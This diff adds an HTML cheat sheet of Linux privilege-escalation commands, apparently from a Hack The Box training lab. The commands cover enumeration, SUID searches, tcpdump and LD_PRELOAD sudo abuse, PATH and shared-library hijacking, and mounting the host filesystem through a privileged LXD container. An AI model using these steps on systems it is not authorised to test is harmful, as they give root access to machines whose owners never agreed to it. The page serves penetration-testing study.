@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linux Priv Escalation Cheatsheet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            padding: 20px;
+            max-width: 800px;
+            margin: auto;
+            background-color: #000;
+            color: #0f0;
+            background-image: url('https://www.transparenttextures.com/patterns/asfalt-light.png');
+        }
+        h1, h2, h3, h4, h5, h6 {
+            border-bottom: 1px solid #0f0;
+            padding-bottom: 0.3em;
+            margin-top: 1.5em;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+        table, th, td {
+            border: 1px solid #0f0;
+        }
+        th, td {
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: rgba(0, 255, 0, 0.2);
+        }
+        code {
+            background-color: #333;
+            color: #0f0;
+            padding: 2px 4px;
+            border-radius: 4px;
+        }
+        pre {
+            background-color: #333;
+            color: #0f0;
+            padding: 10px;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+        blockquote {
+            border-left: 4px solid #0f0;
+            padding-left: 1em;
+            color: #666;
+        }
+        .section-divider {
+            border-top: 1px solid #0f0;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>Linux Priv Escalation Cheatsheet</h1>
+
+    <div class="section-divider"></div>
+    <table>
+        <tr>
+            <th>Command</th>
+            <th>Description</th>
+        </tr>
+        <tr>
+            <td><code>ssh htb-student@&lt;target IP&gt;</code></td>
+            <td>SSH to lab target</td>
+        </tr>
+        <tr>
+            <td><code>ps aux | grep root</code></td>
+            <td>See processes running as root</td>
+        </tr>
+        <tr>
+            <td><code>ps au</code></td>
+            <td>See logged in users</td>
+        </tr>
+        <tr>
+            <td><code>ls /home</code></td>
+            <td>View user home directories</td>
+        </tr>
+        <tr>
+            <td><code>ls -l ~/.ssh</code></td>
+            <td>Check for SSH keys for current user</td>
+        </tr>
+        <tr>
+            <td><code>history</code></td>
+            <td>Check the current user's Bash history</td>
+        </tr>
+        <tr>
+            <td><code>sudo -l</code></td>
+            <td>Can the user run anything as another user?</td>
+        </tr>
+        <tr>
+            <td><code>ls -la /etc/cron.daily</code></td>
+            <td>Check for daily Cron jobs</td>
+        </tr>
+        <tr>
+            <td><code>lsblk</code></td>
+            <td>Check for unmounted file systems/drives</td>
+        </tr>
+        <tr>
+            <td><code>find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null</code></td>
+            <td>Find world-writeable directories</td>
+        </tr>
+        <tr>
+            <td><code>find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</code></td>
+            <td>Find world-writeable files</td>
+        </tr>
+        <tr>
+            <td><code>uname -a</code></td>
+            <td>Check the Kernel version</td>
+        </tr>
+        <tr>
+            <td><code>cat /etc/lsb-release</code></td>
+            <td>Check the OS version</td>
+        </tr>
+        <tr>
+            <td><code>gcc kernel_exploit.c -o kernel_exploit</code></td>
+            <td>Compile an exploit written in C</td>
+        </tr>
+        <tr>
+            <td><code>screen -v</code></td>
+            <td>Check the installed version of <code>Screen</code></td>
+        </tr>
+        <tr>
+            <td><code>./pspy64 -pf -i 1000</code></td>
+            <td>View running processes with <code>pspy</code></td>
+        </tr>
+        <tr>
+            <td><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null</code></td>
+            <td>Find binaries with the SUID bit set</td>
+        </tr>
+        <tr>
+            <td><code>find / -user root -perm -6000 -exec ls -ldb {} \; 2&gt;/dev/null</code></td>
+            <td>Find binaries with the SETGID bit set</td>
+        </tr>
+        <tr>
+            <td><code>sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></td>
+            <td>Priv esc with <code>tcpdump</code></td>
+        </tr>
+        <tr>
+            <td><code>echo $PATH</code></td>
+            <td>Check the current user's PATH variable contents</td>
+        </tr>
+        <tr>
+            <td><code>PATH=.:${PATH}</code></td>
+            <td>Add a <code>.</code> to the beginning of the current user's PATH</td>
+        </tr>
+        <tr>
+            <td><code>find / ! -path "*/proc/*" -iname "*config*" -type f 2&gt;/dev/null</code></td>
+            <td>Search for config files</td>
+        </tr>
+        <tr>
+            <td><code>ldd /bin/ls</code></td>
+            <td>View the shared objects required by a binary</td>
+        </tr>
+        <tr>
+            <td><code>sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</code></td>
+            <td>Escalate privileges using <code>LD_PRELOAD</code></td>
+        </tr>
+        <tr>
+            <td><code>readelf -d payroll | grep PATH</code></td>
+            <td>Check the RUNPATH of a binary</td>
+        </tr>
+        <tr>
+            <td><code>gcc src.c -fPIC -shared -o /development/libshared.so</code></td>
+            <td>Compile a shared library</td>
+        </tr>
+        <tr>
+            <td><code>lxd init</code></td>
+            <td>Start the LXD initialization process</td>
+        </tr>
+        <tr>
+            <td><code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code></td>
+            <td>Import a local image</td>
+        </tr>
+        <tr>
+            <td><code>lxc init alpine r00t -c security.privileged=true</code></td>
+            <td>Start a privileged LXD container</td>
+        </tr>
+        <tr>
+            <td><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</code></td>
+            <td>Mount the host file system in a container</td>
+        </tr>
+        <tr>
+            <td><code>lxc start r00t</code></td>
+            <td>Start the container</td>
+        </tr>
+        <tr>
+            <td><code>showmount -e 10.129.2.12</code></td>
+            <td>Show the NFS export list</td>
+        </tr>
+        <tr>
+            <td><code>sudo mount -t nfs 10.129.2.12:/tmp /mnt</code></td>
+            <td>Mount an NFS share locally</td>
+        </tr>
+        <tr>
+            <td><code>tmux -S /shareds new -s debugsess</code></td>
+            <td>Create a shared <code>tmux</code> session socket</td>
+        </tr>
+        <tr>
+            <td><code>./lynis audit system</code
+
+></td>
+            <td>Perform a system audit with <code>Lynis</code></td>
+        </tr>
+    </table>
+</body>
+</html>
